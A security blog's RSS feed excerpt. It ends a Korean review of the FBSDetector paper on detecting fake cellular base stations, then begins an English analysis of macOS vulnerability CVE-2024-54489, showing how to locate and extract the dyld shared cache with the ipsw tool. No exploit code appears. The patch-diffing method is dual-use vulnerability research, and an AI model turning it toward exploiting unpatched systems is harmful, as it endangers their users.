&#xACB0;&#xD569;&#xC73C;&#xB85C; &#xC131;&#xB2A5; 1~2% &#xD5A5;&#xC0C1;</li><li><strong>Overshadowing &#xACF5;&#xACA9;</strong>&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xC81C;&#xB85C;&#xC0F7; &#xD0D0;&#xC9C0; &#xC815;&#xD655;&#xB3C4; 86%&#xB97C; &#xBCF4;&#xACE0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;</li></ul><p>&#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xB294; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xC774; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_kr/figure4_overhead_analysis.png" alt="Figure 4: &#xC624;&#xBC84;&#xD5E4;&#xB4DC; &#xBD84;&#xC11D;"></p><p>Figure 4: &#xC624;&#xBC84;&#xD5E4;&#xB4DC; &#xBD84;&#xC11D;</p><p><em>&#xADF8;&#xB9BC; 4: &#xD328;&#xD0B7; &#xC218; &#xC99D;&#xAC00;&#xC5D0; &#xB530;&#xB77C; &#xC2DC;&#xAC04;/&#xC804;&#xB825;/&#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xC774; &#xC120;&#xD615; &#xC99D;&#xAC00;&#xD558;&#xC9C0;&#xB9CC; &#xAE30;&#xC6B8;&#xAE30;&#xAC00; &#xC791;&#xC544; &#xC2E4;&#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xC131;&#xC744; &#xBCF4;&#xC5EC;&#xC90C;</em></p><p>&#xB17C;&#xBB38;&#xC740; &#xC815;&#xB7C9;&#xC801;&#xC73C;&#xB85C; &#xD3C9;&#xADE0; <strong>835KB &#xBA54;&#xBAA8;&#xB9AC;</strong>, <strong>2mW &#xBBF8;&#xB9CC; &#xC804;&#xB825;</strong> &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;&#xACE0;&#xB3C4; &#xC81C;&#xC2DC;&#xD569;&#xB2C8;&#xB2E4;(&#xAE30;&#xC874; &#xC811;&#xADFC;&#xC758; 4mW &#xC218;&#xC900;&#xACFC; &#xBE44;&#xAD50;&#xD574; &#xB0AE;&#xC740; &#xD3B8;).</p><p>&#xADF8;&#xB9AC;&#xACE0; MSA&#xC5D0;&#xC11C; FP &#xAE30;&#xC5EC;&#xB3C4;&#xAC00; &#xB192;&#xC740; &#xACF5;&#xACA9; &#xC720;&#xD615;&#xB4E4;&#xC774; &#xB530;&#xB85C; &#xC788;&#xACE0;(UE &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC815;&#xC0C1;&#xACFC; &#xAC70;&#xC758; &#xAD6C;&#xBD84;&#xC774; &#xC548; &#xB418;&#xB294; &#xCF00;&#xC774;&#xC2A4;&#xB4E4;), &#xADF8; &#xBD84;&#xC11D;&#xC744; &#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_kr/figure5_fp_analysis.png" alt="Figure 5: MSA &#xD0D0;&#xC9C0;&#xC5D0;&#xC11C;&#xC758; False Positive &#xBD84;&#xC11D;"></p><p>Figure 5: MSA &#xD0D0;&#xC9C0;&#xC5D0;&#xC11C;&#xC758; False Positive &#xBD84;&#xC11D;</p><p><em>&#xADF8;&#xB9BC; 5: &#xD2B9;&#xC815; &#xACF5;&#xACA9; &#xC720;&#xD615;&#xB4E4;&#xC774; FP&#xC5D0; &#xD06C;&#xAC8C; &#xAE30;&#xC5EC; &#x2192; &#x201C;UE &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC815;&#xC0C1;&#xACFC; &#xAC19;&#xC544; &#xBCF4;&#xC774;&#xB294;&#x201D; &#xAC8C; &#xADFC;&#xBCF8; &#xC6D0;&#xC778;</em></p><p>&#xC2E4;&#xC81C; &#xC571; &#xAC80;&#xC99D;(&#xD1B5;&#xC81C;&#xB41C; &#xC2E4;&#xD5D8;&#xC2E4; &#xD658;&#xACBD;)&#xB3C4; &#xBE44;&#xAD50;&#xC801; &#xAC15;&#xB3C4; &#xB192;&#xAC8C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_kr/figure8_lab_setup.png" alt="Figure 8: &#xC2E4;&#xC81C; &#xC2E4;&#xD5D8;&#xC2E4; &#xD658;&#xACBD; &#xC124;&#xC815;"></p><p>Figure 8: &#xC2E4;&#xD5D8; &#xD658;&#xACBD; &#xC124;&#xC815;</p><p><em>&#xADF8;&#xB9BC; 8: USRP B210, &#xB178;&#xD2B8;&#xBD81;(&#xCF54;&#xC5B4;), &#xC2A4;&#xB9C8;&#xD2B8;&#xD3F0;(&#xC571;) &#xAD6C;&#xC131;&#xC73C;&#xB85C; &#xD1B5;&#xC81C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xD5D8;</em></p><p>&#xC2E4;&#xD5D8; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB294; &#xC790;&#xCCB4; SIM &#xAE30;&#xBC18; &#xC2E4;&#xD5D8;&#xC2E4; 4G &#xB124;&#xD2B8;&#xC6CC;&#xD06C;/&#xC0C1;&#xC6A9; SIM(&#xC608;: Google Fi)/&#xAC70;&#xB9AC; &#xBCC0;&#xD654;/&#xC81C;&#xD55C;&#xC801; &#xC774;&#xB3D9;&#xC131; &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. 24&#xC2DC;&#xAC04; &#xC2A4;&#xD2B8;&#xB808;&#xC2A4; &#xD14C;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; 21&#xAC1C; &#xACF5;&#xACA9;&#xC744; &#xAC01;&#xAC01; 5&#xD68C;&#xC529; &#xC218;&#xD589;&#xD574; &#xCD1D; 105&#xD68C; &#xACF5;&#xACA9;&#xC744; &#xC2E4;&#xD589;&#xD588;&#xACE0;, &#xC7A5;&#xAE30; &#xD14C;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; 7&#xC77C; &#xB3D9;&#xC548; &#xB2E4;&#xC591;&#xD55C; &#xC0AC;&#xC6A9; &#xD328;&#xD134;&#xC5D0;&#xC11C; &#xC571;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA70; &#xD328;&#xD0B7;&#xC774; &#xB204;&#xC801;&#xB418;&#xB294; &#xD658;&#xACBD;&#xC744; &#xAD00;&#xCC30;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xAE30;&#xC874; &#xC571; &#xAE30;&#xBC18; &#xD0D0;&#xC9C0; &#xC194;&#xB8E8;&#xC158;(AIMSICD, SnoopSnitch)&#xACFC; &#xBE44;&#xAD50; &#xC2E4;&#xD5D8;&#xC744; &#xC218;&#xD589;&#xD588;&#xB294;&#xB370;, &#xB3D9;&#xC77C;&#xD55C; &#xC81C;&#xC5B4; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB450; &#xC194;&#xB8E8;&#xC158;&#xC740; FBS&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD588;&#xC9C0;&#xB9CC; FBSDetector&#xB294; &#xD0D0;&#xC9C0;&#xD588;&#xB2E4;&#xACE0; &#xC11C;&#xC220;&#xD569;&#xB2C8;&#xB2E4;.</p><hr><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>FBSDetector&#xB97C; &#xD55C; &#xBB38;&#xC7A5;&#xC73C;&#xB85C; &#xC694;&#xC57D;&#xD558;&#xBA74;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xD5A5;&#xC758; &#x201C;UE &#xCE21; &#xD0D0;&#xC9C0; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#x201D;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Layer-3(NAS/RRC) &#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xB9CC;&#xC73C;&#xB85C;</strong></li><li><strong>&#xB2E8;&#xB9D0;(UE)&#xC5D0;&#xC11C;</strong></li><li><strong>FBS &#xD0D0;&#xC9C0; + MSA &#xC778;&#xC2DD;</strong>&#xC744;</li><li>&#xBE44;&#xAD50;&#xC801; &#xB0AE;&#xC740; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xB85C; &#xC218;&#xD589;&#xD558;&#xB294; &#xC2E4;&#xC6A9;&#xC801; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xB97C; &#xD480;&#xC5B4; &#xC815;&#xB9AC;&#xD558;&#xC790;&#xBA74;, FBSDetector&#xB294; Layer 3 &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; ML &#xAE30;&#xBC18; FBS &#xBC0F; MSA &#xD0D0;&#xC9C0; &#xC2DC;&#xC2A4;&#xD15C;&#xC785;&#xB2C8;&#xB2E4;. &#xB300;&#xADDC;&#xBAA8; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xC14B;(FBSAD, MSAD)&#xC744; &#xAD6C;&#xCD95;&#xD558;&#xACE0;, Stateful LSTM with Attention &#xBC0F; Graph Learning&#xACFC; &#xAC19;&#xC740; &#xACE0;&#xAE09; ML &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xB192;&#xC740; &#xD0D0;&#xC9C0; &#xC815;&#xD655;&#xB3C4;&#xC640; &#xB0AE;&#xC740; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xB97C; &#xB2EC;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD5A5;&#xD6C4; &#xC5F0;&#xAD6C;&#xC5D0;&#xC11C;&#xB294; FBSDetector&#xB97C; 5G &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB85C; &#xD3EC;&#xD305;&#xD558;&#xACE0;, &#xC624;&#xBC84;&#xC100;&#xB3C4;&#xC6B0; &#xACF5;&#xACA9;(overshadow attacks) &#xD0D0;&#xC9C0;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, ORAN &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; FBS &#xD0D0;&#xC9C0; &#xBC0F; &#xACF5;&#xACA9; &#xBC29;&#xC5B4; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xD1B5;&#xD569;&#xC5D0; &#xC9D1;&#xC911;&#xD560; &#xC608;&#xC815;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. 5G &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB85C; &#xD3EC;&#xD305;&#xD558;&#xB294; &#xACFC;&#xC815;&#xACFC; &#xD0D0;&#xC9C0; &#xD560; &#xC218; &#xC788;&#xB294; &#xBC94;&#xC704;&#xB97C; &#xD655;&#xC7A5;&#xD574;&#xB098;&#xAC00;&#xB294; &#xAC83;&#xC5D0; &#xAE30;&#xB300;&#xAC00; &#xB418;&#xB124;&#xC694;.</p><hr><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xAC1C;&#xC778;&#xC801;&#xC73C;&#xB85C;&#xB294; FBS &#xD0D0;&#xC9C0; &#xC790;&#xCCB4;&#xBCF4;&#xB2E4;&#xB3C4;, <strong>MSA&#xB97C; &#xADF8;&#xB798;&#xD504;&#xB85C; &#xBAA8;&#xB378;&#xB9C1;&#xD574;&#xC11C; &#xD328;&#xD134;&#xC73C;&#xB85C; &#xD559;&#xC2B5;</strong>&#xD558;&#xB824;&#xB294; &#xC2DC;&#xB3C4;&#xAC00; &#xC7AC;&#xBC0C;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBB3C;&#xB860; &#xD55C;&#xACC4;&#xB3C4; &#xBA85;&#xD655;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB8E8;&#xD305;/&#xAD8C;&#xD55C;/&#xB2E8;&#xB9D0; &#xC81C;&#xC57D;(&#xD2B9;&#xD788; iOS &#xACC4;&#xC5F4;)&#xC740; &#xC5EC;&#xC804;&#xD788; &#xD070; &#xBC30;&#xD3EC; &#xC7A5;&#xBCBD;</li><li>UE &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC815;&#xC0C1;&#xACFC; &#xACF5;&#xACA9;&#xC774; &#x201C;&#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xBCF4;&#xC774;&#xB294;&#x201D; &#xACF5;&#xACA9;&#xC740; &#xBCF8;&#xC9C8;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB824;&#xC6C0;(FP/FN)</li><li>5G/&#xB2E4;&#xB978; &#xD658;&#xACBD;&#xC73C;&#xB85C; &#xD655;&#xC7A5;&#xD558;&#xB824;&#xBA74; &#xC2E4;&#xD5D8; &#xC778;&#xD504;&#xB77C;&#xC640; &#xB370;&#xC774;&#xD130;&#xC14B; &#xBB38;&#xC81C;&#xAC00; &#xB2E4;&#xC2DC; &#xB4F1;&#xC7A5;</li></ul><p>&#xBC88;&#xC5ED;&#xBCF8;&#xC5D0;&#xC11C; &#xC778;&#xC0C1;&#xC801;&#xC774;&#xC5C8;&#xB358; &#xBD80;&#xBD84;&#xC740; &#x201C;&#xC624;&#xD0D0;/&#xBBF8;&#xD0D0;&#xC758; &#xC758;&#xBBF8;&#x201D;&#xB97C; &#xAF64; &#xD604;&#xC2E4;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xB8EC;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. FBS &#xC790;&#xCCB4;&#xAC00; &#xD754;&#xD55C; &#xC0AC;&#xAC74;&#xC774; &#xC544;&#xB2C8;&#xB2E4; &#xBCF4;&#xB2C8;, &#xC2E4;&#xC81C; &#xBC30;&#xD3EC;&#xC5D0;&#xC11C;&#xB294; FP&#xAC00; &#xC870;&#xAE08;&#xB9CC; &#xB192;&#xC544;&#xB3C4; &#xC0AC;&#xC6A9;&#xC131;&#xC774; &#xD06C;&#xAC8C; &#xB5A8;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB17C;&#xBB38;&#xB3C4; &#xADF8; &#xC810;&#xC744; &#xC804;&#xC81C;&#xB85C;, &#xD604;&#xC7AC; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xB300;&#xC911; &#xC804;&#xCCB4;&#xBCF4;&#xB2E4;&#xB294; &#xBCF4;&#xC548; &#xC6B0;&#xC120; &#xD658;&#xACBD;/&#xBBFC;&#xAC10; &#xC0AC;&#xC6A9;&#xC790;&#xAD70;&#xC5D0;&#xC11C; &#xD2B9;&#xD788; &#xC720;&#xC6A9;&#xD558;&#xB2E4;&#xB294; &#xC2DD;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xD560; &#xC5EC;&#xC9C0;&#xB97C; &#xB0A8;&#xAE41;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xB3C4; &#xD765;&#xBBF8;&#xB86D;&#xAC8C; &#xC77D;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! &#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC140;&#xB8F0;&#xB7EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xAD00;&#xB828; &#xB17C;&#xBB38;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xB9AC;&#xBDF0; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;~~</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/FBS/">FBS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Paper/">Paper</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/21/clalxk/fbs_paper_review_kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] CVE-2024-54489 Analysis from Security Updates Part 2(EN)</title>
      <link>https://hackyboiz.github.io/2025/12/18/ji9umi/cve-2024-54489-analysis-from-security-updates-part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/12/18/ji9umi/cve-2024-54489-analysis-from-security-updates-part2/en/</guid>
      <pubDate>Thu, 18 Dec 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;image1.jpg&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2024-54489 Analysis Series&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/09/13/ji</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="image1.jpg" alt="image"></p><ul><li>CVE-2024-54489 Analysis Series<ul><li><a href="https://hackyboiz.github.io/2025/09/13/ji9umi/%5BResearch%5DCVE-2024-54489/EN/">Part 1</a></li><li>Part 2 [Current Post]</li></ul></li></ul><h2 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h2><p>Hi, I&#x2019;m ji9umi! In the previous post, we analyzed CVE-2024-54489 and tested several approach methods. Here is summary of what we covered:</p><ol><li>CVE-2024-54489 was identified by Apple as a vulnerability residing in Disk Utility.</li><li><p>I performed a diffing analysis on <strong>Disk Utility.app</strong></p><p> &#x2192; but found no specific changes related to patch.</p></li><li><p>By diffing the <strong>IPSW</strong> files to compare the full system, I confirmed that the changes exist in associated in frameworks and other elements rather than in Disk Utility itself.</p></li><li>I am currently conducting static analysis to determine the root cause.</li></ol><p>In Part 1, I focused the static analysis on identifying the execution flow within the application. I confirmed that both flows for processing mount requests reference methods implemented inside the <strong>Dyld Shared Cache</strong>.</p><ul><li><code>[obj_1 mountWithCompletionBlock:]</code> from <strong>StorageKit.framework</strong></li><li><code>_DIHLDiskImageAttach()</code>  from <strong>DiskImages.framework</strong></li></ul><h2 id="1-Analyze-DSC"><a href="#1-Analyze-DSC" class="headerlink" title="1. Analyze DSC"></a>1. Analyze DSC</h2><h3 id="1-1-extract-shared-cache"><a href="#1-1-extract-shared-cache" class="headerlink" title="1.1. extract shared cache"></a>1.1. extract shared cache</h3><p>The two methods requiring further analysis are implemented within frameworks, which can be found in three different locations within the file system:</p><ul><li><code>/System/Library/Frameworks/</code></li><li><code>/System/Library/PrivateFrameworks/</code></li><li><code>/Library/Frameworks/</code></li></ul><p>The items requiring verification are the StorageKit and DiskImages frameworks, which can be found in the following path: <code>/System/Library/PrivateFrameworks/</code></p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ file /System/Library/PrivateFrameworks/StorageKit.framework /System/Library/PrivateFrameworks/StorageKit.framework: directory&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ file /System/Library/PrivateFrameworks/DiskImages.framework /System/Library/PrivateFrameworks/DiskImages.framework: directory</code></pre><p>First, upon inspecting the StorageKit.framework directory, you will notice that the actual binary file required for analysis is missing.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> /System/Library/PrivateFrameworks/StorageKit.framework &#x2570;$ tree ..&#x251C;&#x2500;&#x2500; Resources -&gt; Versions/Current/Resources&#x251C;&#x2500;&#x2500; StorageKit -&gt; Versions/Current/StorageKit&#x2514;&#x2500;&#x2500; Versions    &#x251C;&#x2500;&#x2500; A    &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; _CodeSignature    &#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; CodeResources    &#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; Resources    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ar.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; BootCampAssistant.icns    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ca.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; cs.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; da.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; de.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; el.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; en_AU.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; en_GB.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; en.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; es_419.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; es_US.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; es.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; fi.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; fr_CA.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; fr.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; he.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; hi.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; hr.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; hu.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; id.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; Info.plist    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; InfoPlist.loctable    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; it.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ja.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ko.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; Localizable.loctable    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ms.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; nl.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; no.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; pl.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; pt_BR.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; pt_PT.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ro.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ru.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; sk.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; SKError.loctable    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; sl.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; sv.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; th.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; tr.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; uk.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; UserPictureNotFound.jpg    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; version.plist    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; vi.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; zh_CN.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; zh_HK.lproj    &#x2502;&#xA0;&#xA0;     &#x2514;&#x2500;&#x2500; zh_TW.lproj    &#x2514;&#x2500;&#x2500; Current -&gt; A48 directories, 9 files</code></pre><p>This is because, starting with macOS Big Sur, all built-in libraries into a single integrated cache file to optimize system boot performance. This file is known as the <strong>dyld shared cache</strong>, and it can be found at the following path: <code>/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/</code>. Additionally, you can see that separate files exist to support both x86_64 and arm64e architectures.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ ls -l /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/total 10850248-rwxr-xr-x  1 root  admin   844242203 Aug 17 03:44 aot_shared_cache.0-rwxr-xr-x  1 root  admin   910422299 Aug 17 03:44 aot_shared_cache.1-rwxr-xr-x  1 root  admin   897691547 Aug 17 03:44 aot_shared_cache.2-rwxr-xr-x  1 root  admin   787358363 Aug 17 03:44 aot_shared_cache.3-rwxr-xr-x  1 root  admin   896155931 Aug 17 03:44 aot_shared_cache.4-rwxr-xr-x  1 root  admin   713302043 Aug 17 03:44 aot_shared_cache.5-rwxr-xr-x  1 root  admin  2712764416 Aug 17 03:44 dyld_shared_cache_arm64e-rwxr-xr-x  1 root  admin  2203500544 Aug 17 03:44 dyld_shared_cache_arm64e.01-rwxr-xr-x  1 root  admin     2023837 Aug 17 03:44 dyld_shared_cache_arm64e.atlas-rwxr-xr-x  1 root  admin     1140220 Aug 17 03:44 dyld_shared_cache_arm64e.map-rwxr-xr-x  1 root  admin   877608960 Aug 17 03:44 dyld_shared_cache_x86_64-rwxr-xr-x  1 root  admin   804831232 Aug 17 03:44 dyld_shared_cache_x86_64.01-rwxr-xr-x  1 root  admin   789921792 Aug 17 03:44 dyld_shared_cache_x86_64.02-rwxr-xr-x  1 root  admin   777699328 Aug 17 03:44 dyld_shared_cache_x86_64.03-rwxr-xr-x  1 root  admin   782598144 Aug 17 03:44 dyld_shared_cache_x86_64.04-rwxr-xr-x  1 root  admin   850001920 Aug 17 03:44 dyld_shared_cache_x86_64.05-rwxr-xr-x  1 root  admin     1155495 Aug 17 03:44 dyld_shared_cache_x86_64.atlas-rwxr-xr-x  1 root  admin      959702 Aug 17 03:44 dyld_shared_cache_x86_64.map</code></pre><p>If the target version matches your currently installed OS, you can simply load the files from their local directory into a decompiler. However, if you want to analyze a different version, you must extract them from the firmware. For this process, you can use the <code>ipsw</code> tool, which we previously used for diffing.</p><p>In addition to the <code>diff</code> command, the <code>ipsw</code> tool supports an extract command for file extraction, which includes various flags depending on you target.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ ipsw extract -hExtract kernelcache, dyld_shared_cache or DeviceTree from IPSW/OTAUsage:  ipsw extract &lt;IPSW/OTA | URL&gt; [flags]Aliases:  extract, e, exExamples:<span class="hljs-comment"># Extract kernelcache from IPSW</span>$ ipsw extract --kernel iPhone15,2_16.5_20F66_Restore.ipsw<span class="hljs-comment"># Extract dyld_shared_cache for specific architecture</span>$ ipsw extract --dyld --dyld-arch arm64e iPhone.ipsw<span class="hljs-comment"># Extract all files matching a pattern (from the IPSW zip contents)</span>$ ipsw extract --pattern <span class="hljs-string">&apos;.*\.ttf$&apos;</span> iOS.ipsw<span class="hljs-comment"># Extract multiple components with custom output directory</span>$ ipsw extract --kernel --sep --dyld -o /tmp/extracted iPhone.ipsw<span class="hljs-comment"># Extract from remote URL</span>$ ipsw extract --kernel --remote https://updates.cdn-apple.com/iPhone.ipsw<span class="hljs-comment"># Extract system version info as JSON</span>$ ipsw extract --sys-ver iPhone.ipsw<span class="hljs-comment"># Extract files from filesystem DMG matching pattern</span>$ ipsw extract --files --pattern <span class="hljs-string">&apos;.*LaunchDaemons.*\.plist$&apos;</span> iPhone.ipsw<span class="hljs-comment"># Extract DriverKit dyld_shared_cache</span>$ ipsw extract --dyld --driverkit macOS.ipsw</code></pre><p>Since the target is located within the file system, you can use a combination of the <code>--files</code> and <code>--pattern</code> flags. However, using the more convenient <code>--dyld</code> and <code>--dyld-arch</code> flags allows for a faster extraction by specificially defining the architectures.</p><p>Upon checking the extracted files, you will notice that two additional files have been extracted along with the target file.</p><pre><code class="hljs objectivec">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~/Mine/<span class="hljs-number">001</span>_Security/n-day/CVE<span class="hljs-number">-2024</span><span class="hljs-number">-54489</span>/rsc/<span class="hljs-number">24</span>B91__MacOS &#x2570;$ ls -l dyld_shared_cache_arm64e*-rwxr-xr-x@ <span class="hljs-number">1</span> ji9umi  staff  <span class="hljs-number">2506964992</span> Sep  <span class="hljs-number">6</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span> 